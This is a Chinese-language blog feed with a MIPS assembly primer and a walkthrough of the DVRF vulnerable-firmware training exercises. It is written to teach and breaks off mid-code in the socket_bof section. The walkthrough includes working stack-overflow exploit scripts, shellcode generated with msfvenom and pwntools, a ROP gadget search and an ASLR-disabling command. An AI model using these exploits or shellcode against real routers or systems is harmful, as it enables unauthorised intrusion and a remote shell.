<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>C12en</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-03-28T03:48:28.068Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>C12en</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>MIPS架构学习</title>
    <link href="http://example.com/2024/02/27/mips%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2024/02/27/mips%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-02-27T07:47:06.000Z</published>
    <updated>2024-03-28T03:48:28.068Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install libncurses5-dev gcc-arm-linux-gnueabi build-essential synaptic gcc-aarch64-linux-gnu</span><br><span class="line"></span><br><span class="line">sudo apt-get install gcc-mips-linux-gnu gcc-mipsel-linux-gnu gcc-mips64-linux-gnuabi64 gcc-mips64el-linux-gnuabi64</span><br></pre></td></tr></table></figure><h1 id="编译及运行"><a href="#编译及运行" class="headerlink" title="编译及运行"></a>编译及运行</h1><p>MIPS架构 其也包括大小端序 32位和64位<br>32位小端序 mipsel<br>32位大端序 mips<br>64位小端序 mips64el<br>64位大端序 mips64<br>用如下所示代码编译一个32位小端序的二进制文件 并尝试使用qemu模拟运行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include&lt;stdint.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">void init()&#123;</span><br><span class="line">    setvbuf(stdout, 0, 2, 0);</span><br><span class="line">    setvbuf(stdin, 0, 2, 0);</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    init();</span><br><span class="line">    printf(&quot;%s&quot;,&quot;test\n&quot;);</span><br><span class="line">    char buf[0x20];</span><br><span class="line">    read(0,buf,0x30);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mipsel-linux-gnu-gcc -o test test.c</span><br></pre></td></tr></table></figure><p>qemu模拟运行指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu-mipsel-static -L /usr/mipsel-linux-gnu/ ./test</span><br></pre></td></tr></table></figure><h1 id="mips"><a href="#mips" class="headerlink" title="mips"></a>mips</h1><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>这里以o32 abi接口标准为主<br>其约定的寄存器如下<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202402271658263.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202402271658263.png" alt="image.png"></a><br>此外 MIPS架构还强制要求协处理器 最多可以拥有4个<br>固定拥有协处理器cp0<br>其功能包括CPU配置 Cache控制 异常、中断控制 中断或异常发生时的行为和处理的定义 内存管理单元控制等等<br>协处理器cp0一共包括32个寄存器 这里挑选几个比较重要的寄存器来记忆</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sr 状态寄存器 可以反应cpu的状态以及控制cpu</span><br><span class="line">$lo $hi 整数乘除法寄存器 只用来存放整数乘除法运算的结果 前者存放商 后者存放余数</span><br><span class="line">$pc 程序计数器 标志着当前要执行的指令 类似于x86架构中的eip</span><br><span class="line">$f0-$f31 浮点数寄存器</span><br></pre></td></tr></table></figure><h2 id="读懂简单的程序汇编"><a href="#读懂简单的程序汇编" class="headerlink" title="读懂简单的程序汇编"></a>读懂简单的程序汇编</h2><p>这里通过上面编译出来的32位小端序程序来逐行分析汇编<br>以main函数为例<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403071258753.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403071258753.png" alt="image.png"></a><br>addiu和addi功能相同 为左侧操作数加上右侧的立即数 不过addiu并不会检测溢出<br>$sp指向栈顶 这里抬高栈顶 为后续操作腾出栈空间<br>sw(store word)将寄存器的值保存到某地址 这里将返回地址保存到$sp+0x40+0x4处<br>下一行将栈底指针保存到$sp+0x40处<br>move指令用于寄存器值之间的传递 这里使$fp&#x3D;$sp 将栈底指针也抬高到栈顶处<br>前面这些操作类似于x64架构中的初始化栈帧空间以及保存返回地址以便返回到上一个执行语句<br>li(load immediate)将立即数赋值给寄存器 这里把0x419010传给$gp 顺带下一句把$gp的值保存到了$sp+0x40-0x30处<br>la(load address)将地址赋值给寄存器<br>lw(load word)将某地址内的值赋值给寄存器<br>__stack_chk_guard的地址也为0x4110a0 这两句组合起来就相当于将canary的值赋值给v0寄存器<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403071342441.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403071342441.png" alt="image.png"></a><br>接着用sw 将v0的值存储到$fp+0x40-0x4中<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403071356771.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403071356771.png" alt="image.png"></a><br>红框圈起来的是该语句写入的canary 而你会发现 这里实际上是往$s8+0x3c处写入 而不是$fp<br>查阅了cyberangle师傅的博客后 得知对于gdb来说 对于$fp的操作就等于对于$s8操作<br>上面没提及的是 $fp是30号寄存器 根据编译器的不同 30号寄存器也可以看作是$s8<br>在介绍jal汇编指令之前 需要引入两个概念 叶子函数和非叶子函数<br><strong>叶子函数: 该函数中不会再调用其他函数</strong><br><strong>非叶子函数: 该函数中会调用其他函数</strong><br>这里以另外一个程序为例来观察二者的区别</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void vuln()&#123;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    vuln();</span><br><span class="line">    puts(&quot;exit&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了排除开启canary保护加入的stack_fail_check函数带来的影响 这里选择关闭canary保护<br>此时按照上面的理念 可以判断出main函数调用了vuln和printf属于非叶子函数 vuln函数为叶子函数<br>先来看非叶子函数main<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403181918987.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403181918987.png" alt="image.png"></a><br>首先 抬栈腾出栈帧空间 随后往栈上保存返回地址和栈底指针 迁移sp指针至fp指针<br>随后跳转执行vuln函数<br>再来看叶子函数vuln<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403181944412.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403181944412.png" alt="image.png"></a><br>可以明显看到 叶子函数并没有将$ra寄存器的值存放到栈上 这是因为非叶子函数需要调用到其他函数 所以将返回地址暂存到栈上 而叶子函数不必考虑这一点<br>那么说回到jal指令 其将对应函数的地址载入ra寄存器 随后nop滑动执行函数<br>接着以test程序的main函数来分析 看一下puts函数是如何调用的<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403182025876.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403182025876.png" alt="image.png"></a><br>先把之前存到栈上的gp寄存器值重新赋值给寄存器<br>lui(load upper immediate) 取立即数存到寄存器的高16位 低16位用0填充<br>此时v0寄存器为0x00400000<br>aTest指向存放于rodata段的test字符串 此时的addiu相当于 a0&#x3D;v0+(aTest-0x400000)<br>随后将puts函数的地址存放到t9寄存器中<br>jarl和jal指令的区别在于 前者会多一个存放返回地址的功能<br>其有两种格式  jalr opt1 opt2 和jalr opt1<br>当为前者时 返回地址存入opt2 为后者时 返回地址存入ra寄存器<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403221026926.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403221026926.png" alt="image.png"></a><br>分析一下 像read这类需要多参数的函数如何处理<br>可以看到三个参数是用寄存器$a0-$a2存储 不同于i386架构的32位是利用栈来传参<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403221035890.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403221035890.png" alt="image.png"></a><br>最后来看开启了canary保护的栈帧是如何结束的<br>重点在于beq指令 如果$v1(也就是栈上的canary)和$v0相等<br>那么就跳转到loc_400920 否则调用stack_chk_fail函数来输出报错以及终止程序<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403281138947.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403281138947.png" alt="image.png"></a><br>栈帧末尾 清空了v0寄存器 使其为0 和i386架构类似 后者把eax寄存器用于存储函数返回值<br>随后把$sp挪到$fp所指向的地址 也就是最开始$sp抬高栈帧后的地址<br>随后取回放在栈上的$ra和$fp<br>一开始把$sp往低地址移动了0x48字节 在结束后将$sp放回去<br>随后跳转回到$ra中存储的返回地址</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>DVRF项目学习</title>
    <link href="http://example.com/2024/02/25/dvrf%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2024/02/25/dvrf%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-02-25T03:31:19.000Z</published>
    <updated>2024-05-12T06:24:07.606Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Damn Vulnerable Router Firmware (DVRF)是一个帮助了解x86&#x2F;64以外架构的项目 支持qemu模拟搭建环境<br>项目地址 <a href="https://github.com/praetorian-inc/DVRF">https://github.com/praetorian-inc/DVRF</a></p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/praetorian-inc/DVRF.git</span><br></pre></td></tr></table></figure><p>下载项目后 使用binwalk分解出文件系统</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">binwalk -Me DVRF_v03.bin 该文件位于Firmware文件夹中</span><br></pre></td></tr></table></figure><p>所涉及到的漏洞文件位于pwnable文件夹中</p><h1 id="stack-bof-01"><a href="#stack-bof-01" class="headerlink" title="stack_bof_01"></a>stack_bof_01</h1><p>先来看这个文件 readelf查看架构  发现是mips<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202402251155344.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202402251155344.png" alt="image.png"></a><br>尝试使用qemu模拟运行一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chroot  . ./qemu-mipsel-static  ./pwnable/Intro/stack_bof_01</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202402251255367.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202402251255367.png" alt="image.png"></a><br>需要在程序后面跟上参数 随便带一个aaaa试试<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202402251257464.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202402251257464.png" alt="image.png"></a><br>应该是有一个空间存放输入的字符串 加上打印出了字符串 猜测可能存在溢出的情况 使用ida打开程序看看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int16 v4; // [sp+18h] [+18h] BYREF</span><br><span class="line">  char v5[198]; // [sp+1Ah] [+1Ah] BYREF</span><br><span class="line"></span><br><span class="line">  v4 = 0;</span><br><span class="line">  memset(v5, 0, sizeof(v5));</span><br><span class="line">  if ( argc &lt; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Usage: stack_bof_01 &lt;argument&gt;\r\n-By b1ack0wl\r&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Welcome to the first BoF exercise!\r\n\r&quot;);</span><br><span class="line">  strcpy((char *)&amp;v4, argv[1]);</span><br><span class="line">  printf(&quot;You entered %s \r\n&quot;, (const char *)&amp;v4);</span><br><span class="line">  puts(&quot;Try Again\r&quot;);</span><br><span class="line">  return 65;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先分析一下main函数 开始对于argc参数进行了判断 其用来表示程序外部输入参数的个数<br>初始值为1 即运行程序的指令 如果我们后续再跟入一个参数 即可以跳过if分支<br>接下来使用strcpy函数将输入的参数复制到v4数组中 没有对写入的字节数进行限制 这里就存在栈溢出<br>同时还存在dat_shell函数 通过执行该函数 可以直接获取shell<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301626746.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301626746.png" alt="image.png"></a><br>通过对mips架构的程序了解 返回地址存储在栈上 在栈帧结束后 通过$ra寄存器进行跳转<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301635598.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301635598.png" alt="image.png"></a><br>比对strcpy函数和最后的$ra寄存器值 大致可以推测出偏移为0xcc 准备利用动调来测试一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">addiu   $v0, $fp, 0xE0+var_C8</span><br><span class="line"></span><br><span class="line">lw      $ra, 0xE0+var_s4($sp)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chroot  . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line"></span><br><span class="line">gdb-multiarch ./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/stack_bof_01</span><br></pre></td></tr></table></figure><p>可以看到偏移就为0xcc 此时我们在垃圾数据后加上漏洞函数的地址 看是否能够劫持程序执行流<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301643411.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301643411.png" alt="image.png"></a><br>编写exp脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.arch = &quot;mips&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">payload = &quot;a&quot;*0xcc + &#x27;\x50&#x27;+&#x27;\\&#x27;+&#x27;\x09\x40&#x27;</span><br><span class="line"></span><br><span class="line">io = process(&quot;qemu-mipsel-static -L ./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/ -g 2222 ./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/stack_bof_01 &quot;+payload,shell=True)</span><br><span class="line">elf = ELF(&quot;./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/stack_bof_01&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>虽然此时已经劫持了返回地址 但是会发现程序卡在了这句<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301756554.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301756554.png" alt="image.png"></a><br>查阅了其他师傅的博客后 发现问题出在了t9这个寄存器上<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301757914.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301757914.png" alt="image.png"></a><br>如图 dal_shell函数中调用的每个函数的参数都由$t9来索引 为了成功调用函数<br>我们还需要控制t9的值 t9的值默认为当前函数开始的地址<br>接下来的问题在于如何控制t9寄存器<br>利用ropper查询一下gadget 漏洞文件中未发现 查看一下libc文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ropper -f libc.so.0 --search &quot;lw $t9&quot;</span><br></pre></td></tr></table></figure><p>以sp寄存器为索引的地址相对来说更好控制 可以在栈溢出的时候顺便设置 这里的两句都可以使用<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404072114740.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404072114740.png" alt="image.png"></a><br>随后关闭aslr 来减小我们做题的难度</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>但是在查询libc基址的时候发现  vmmap无法显示出来地址<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404072257376.png" title="e59c768b79190538edb1c9f4ab494194.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404072257376.png" alt="e59c768b79190538edb1c9f4ab494194.png"></a><br>于是打算利用memset中的got表来获取真实地址<br>断点打在执行memset函数后<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404171355050.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404171355050.png" alt="image.png"></a><br>得到memset的真实地址 打开libc文件 查得偏移为0x1BE10<br>计算得到libc基址<br>那么就可以得到lw $t9该条gadget的地址了<br>往对应的位置填入后门函数的起始地址赋值给$t9 成功执行<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404171400209.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404171400209.png" alt="image.png"></a><br>完整exp:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.arch = &quot;mips&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = 0x3fee5000</span><br><span class="line">t9 = 0x00021278+libc_base #0x3ff11ff4</span><br><span class="line"></span><br><span class="line">#payload = &quot;a&quot;*0xcc + &#x27;\xf4\x1f\xf1\x3f&#x27; + &#x27;\x50&#x27;+&#x27;\\&#x27;+&#x27;\x09\x40&#x27;</span><br><span class="line">payload = b&quot;a&quot;*0xcc + p32(t9)+b&#x27;\x50&#x27;+b&#x27;\\&#x27;+b&#x27;\x09\x40&#x27;+cyclic(0x3d)+b&#x27;\x50&#x27;+b&#x27;\\&#x27;+b&#x27;\x09\x40&#x27;</span><br><span class="line"></span><br><span class="line">io = process(b&quot;qemu-mipsel-static -L ./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/ -g 1111 ./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/stack_bof_01 &quot;+payload,shell=True)</span><br><span class="line">elf = ELF(&quot;./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/stack_bof_01&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="stack-bof-02"><a href="#stack-bof-02" class="headerlink" title="stack_bof_02"></a>stack_bof_02</h1><p>32位小端序mips架构<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404171406868.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404171406868.png" alt="image.png"></a><br>主要的一个漏洞仍然是通过strcpy引发的栈溢出 但是该程序没有提供后门函数 并且在描述中提到需要使用shellcode</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int16 v4; // [sp+18h] [+18h] BYREF</span><br><span class="line">  char v5[498]; // [sp+1Ah] [+1Ah] BYREF</span><br><span class="line"></span><br><span class="line">  v4 = 0;</span><br><span class="line">  memset(v5, 0, sizeof(v5));</span><br><span class="line">  if ( argc &lt; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Usage: stack_bof_01 &lt;argument&gt;\r\n-By b1ack0wl\r&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Welcome to the Second BoF exercise! You&#x27;ll need Shellcode for this! ;)\r\n\r&quot;);</span><br><span class="line">  strcpy((char *)&amp;v4, argv[1]);</span><br><span class="line">  printf(&quot;You entered %s \r\n&quot;, (const char *)&amp;v4);</span><br><span class="line">  puts(&quot;Try Again\r&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有开启任何保护<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404171408877.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404171408877.png" alt="image.png"></a><br>那么还是老办法 想办法得到垃圾数据的长度 接着往栈上写入shellcode 随后劫持$ra寄存器跳转至shellcode<br>这里介绍一个工具msfvenom 用其来生成我们所需要的shellcode</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo snap install metasploit-framework 安装</span><br></pre></td></tr></table></figure><p>这里指定一下要生成的类型 执行&#x2F;bin&#x2F;sh的系统调用 mipsel架构 linux平台 去除\x00字符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/mipsle/exec  CMD=/bin/sh  --arch mipsle --platform linux -f py --bad-chars &quot;\x00&quot;</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404172109163.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404172109163.png" alt="image.png"></a><br>在查询了其他师傅的博客后 发现都提到了一点 即可以利用nop sled来增加shellcode的泛用性<br>大概的原理就是通过大量的nop指令堆在shellcode前面 这样程序执行流不管落在哪里都可以往下执行 和做x86题目用到的思路是一样的<br>不过这里由于我关闭了aslr 所以栈的地址是固定的 就用不上了<br>使用pwntools自带的shellcraft也可以生成shellcode<br>顺带一提 如果使用stack_bof_01的exp脚本那种形式 不知道为什么同样的shellcode无法打通<br>所以这里更换了一下exp 将payload写到文件中 再将文件的内容作为stack_bof_01的参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from systemd import*</span><br><span class="line">context(log_level=&#x27;debug&#x27;,arch=&#x27;mips&#x27;,endian=&#x27;little&#x27;,bits=32)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stack_addr = 0x407ffbe8</span><br><span class="line">payload = shellcode.ljust(0x1fc,b&#x27;a&#x27;)+p32(stack_addr)</span><br><span class="line"></span><br><span class="line">with open(&quot;payload&quot;,&quot;wb+&quot;) as f:</span><br><span class="line"> f.write(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#io = process(b&quot;./qemu-mipsel-static -L .  -g 1111 ./pwnable/ShellCode_Required/stack_bof_02 &quot;+payload,shell=True)</span><br><span class="line"></span><br><span class="line">#elf = ELF(&quot;./pwnable/ShellCode_Required/stack_bof_02&quot;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./qemu-mipsel-static -L .  ./pwnable/ShellCode_Required/stack_bof_02 &quot;$(cat payload)&quot;</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404281019473.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404281019473.png" alt="image.png"></a></p><h1 id="socket-bof"><a href="#socket-bof" class="headerlink" title="socket_bof"></a>socket_bof</h1><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404281022879.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404281022879.png" alt="image.png"></a><br>32位小端序mips架构<br>保护全关<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404281058933.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404281058933.png" alt="image.png"></a><br>接着来分析一下程序的主体逻辑</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  uint16_t v3; // $v0</span><br><span class="line">  int v4; // $v0</span><br><span class="line">  int v5; // $v0</span><br><span class="line">  size_t v6; // $v0</span><br><span class="line">  int v8; // [sp+24h] [+24h]</span><br><span class="line">  int fd; // [sp+28h] [+28h]</span><br><span class="line">  __int16 v10; // [sp+2Ch] [+2Ch] BYREF</span><br><span class="line">  char v11[498]; // [sp+2Eh] [+2Eh] BYREF</span><br><span class="line">  __int16 v12; // [sp+220h] [+220h] BYREF</span><br><span class="line">  char v13[48]; // [sp+222h] [+222h] BYREF</span><br><span class="line">  int v14; // [sp+254h] [+254h] BYREF</span><br><span class="line">  struct sockaddr v15; // [sp+258h] [+258h] BYREF</span><br><span class="line"></span><br><span class="line">  if ( argc &lt; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Usage: %s port_number - by b1ack0wl\n&quot;, *argv);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  memset(v11, 0, sizeof(v11));</span><br><span class="line">  v12 = 0;</span><br><span class="line">  memset(v13, 0, sizeof(v13));</span><br><span class="line">  v14 = 1;</span><br><span class="line">  fd = socket(2, 2, 0);</span><br><span class="line">  bzero(&amp;v15, 0x10u);</span><br><span class="line">  v15.sa_family = 2;</span><br><span class="line">  *&amp;v15.sa_data[2] = htons(0);</span><br><span class="line">  v3 = atoi(argv[1]);</span><br><span class="line">  *v15.sa_data = htons(v3);</span><br><span class="line">  v4 = atoi(argv[1]);</span><br><span class="line">  printf(&quot;Binding to port %i\n&quot;, v4);</span><br><span class="line">  if ( bind(fd, &amp;v15, 0x10u) == -1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = atoi(argv[1]);</span><br><span class="line">    printf(&quot;Error Binding to port %i\n&quot;, v5);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( setsockopt(fd, 0xFFFF, 4, &amp;v14, 4u) &lt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Setsockopt failed :(&quot;);</span><br><span class="line">    close(fd);</span><br><span class="line">    exit(2);</span><br><span class="line">  &#125;</span><br><span class="line">  listen(fd, 2);</span><br><span class="line">  v8 = accept(fd, 0, 0);</span><br><span class="line">  bzero(&amp;v10, 0x1F4u);</span><br><span class="line">  write(v8, &quot;Send Me Bytes:&quot;, 0xEu);</span><br><span class="line">  read(v8, &amp;v10, 0x1F4u);</span><br><span class="line">  sprintf(&amp;v12, &quot;nom nom nom, you sent me %s&quot;, &amp;v10);</span><br><span class="line">  printf(&quot;Sent back - %s&quot;, &amp;v10);</span><br><span class="line">  v6 = strlen(&amp;v12);</span><br><span class="line">  write(v8, &amp;v12, v6 + 